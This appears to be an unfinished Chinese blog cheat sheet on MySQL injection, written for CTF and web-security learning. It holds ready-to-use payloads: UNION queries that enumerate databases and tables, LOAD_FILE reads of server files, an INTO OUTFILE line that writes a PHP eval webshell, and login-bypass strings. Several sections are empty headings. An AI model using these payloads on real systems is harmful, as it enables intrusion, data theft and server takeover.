---
title: MySql注入备忘录
date: 2017-07-21 14:43:02
tags: [CTF,SQL注入,web]
categories: Web安全
copyright: true
---
# 简介

# 基本
## 查看当前数据库版本
+ VERSION()
+ @@VERSION
+ @@GLOBAL.VERSION

## 当前登录用户
+ USER()
+ CURRENT_USER()
+ SYSTEM_USER()
+ SESSION_USER()

## 当前使用的数据库
+ DATABASE()
+ SCHEMA()

## 路径相关
+ @@BASEDIR : mysql安装路径：
+ @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
+ @@DATADIR : 数据存储路径：
+ @@CHARACTER_SETS_DIR : 字符集设置文件路径
+ @@LOG_ERROR : 错误日志文件路径：
+ @@PID_FILE : pid-file文件路径
+ @@BASEDIR : mysql安装路径：
+ @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：

## 联合数据：
+ CONCAT()
+ GROUP_CONCAT()
+ CONCAT_WS()

## 字母/数字相关
+ ASCII(): 获取字母的ascii码值
+ BIN(): 返回值的二进制串表示
+ CONV(): 进制转换
+ FLOOR()
+ ROUND()
+ LOWER()：转成小写字母
+ UPPER(): 转成大写字母
+ HEX():十六进制编码
+ UNHEX()：十六进制解码


## 字符串截取
+ MID()
+ LEFT()
+ SUBSTR()
+ SUBSTRING()

## 注释
### 行间注释
+ --   (--后面有个空格)
	+ DROP sampletable;--
+ #
	+ DROP sampletable;#

### 行内注释
+ /\* \*/
	+DROP/\* 内容 \*/sampletable;
+ /\*! 语句  \*/
	+  /\*! select \* from test \*/
	+ 语句会被执行

# 注入技术
## 判断是否存在注入
假设有: www.test.com/chybeta.php?id=1
### 数值型注入
```mysql
chybeta.php?id=1+1
chybeta.php?id=-1 or 1=1
chybeta.php?id=-1 or 10-2=8
chybeta.php?id=1 and 1=2
chybeta.php?id=1 and 1=1
```
### 字符型注入
参数被引号包围，我们需要闭合引号。
```
chybeta.php?id=1'
chybeta.php?id=1"
chybeta.php?id=1' and '1'='1
chybeta.php?id=1" and "1"="1
```

## 联合查询
### 查询数据库
```
UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #
```
### 查询表名
```
UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #
```
假设获取到数据库名为"databasename"后，对其进行十六进制编码得到0x64617461626173656e616d65。
```
UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #
```
### 查询列名
```

```
## insert/update/delete注入
## order by注入
## 报错注入
## 盲注
### 布尔盲注
### 延时盲注
## 宽字节注入
## 文件读写
利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。

### load_file()读取
#### 条件
+ 需要有读取文件的权限
+ 需要知道文件的绝对物理路径。

#### 语法
直接使用绝对路径,注意对路径中斜杠的处理。
```mysql
UNION SELECT LOAD_FILE("C://TEST.txt") #

UNION SELECT LOAD_FILE("C:/TEST.txt") #

UNION SELECT LOAD_FILE("C:\\TEST.txt") #
```
使用编码
```
UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #

UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #
```

### select导出
#### 条件
+ 一般要指定绝对路径
+ 需导出的目录有可写权限
+ 要outfile出的文件不能已经存在

#### 语法
```
UNION SELECT DATABASE() INTO OUTFILE 'C:\\phpstudy\\WWW\\test\\1';

UNION SELECT DATABASE() INTO OUTFILE 'C:/phpstudy/WWW/test/1';
```

#### 写入webshell
##### 条件
+ 需要知道网站的绝对物理路径，这样导出后的webshell可访问
+ 对需导出的目录有可写权限。

##### 语法
```
UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/test/webshell.php';
```

## 万能密码后台登陆
+ admin' --
+ admin' #
+ admin'/*
+ or '=' or
+ ' or 1=1--
+ ' or 1=1#
+ ' or 1=1/*
+ ') or '1'='1--
+ ') or ('1'='1--

## 命令执行

# 绕过技巧
##  sqlmap-tamper编写
# 版本特性

# 常见sql注入位置

# 工具
# 参考
+ [MySQL_Testing_Injection](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
+ [MySQL SQL Injection Cheat Sheet](http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/)
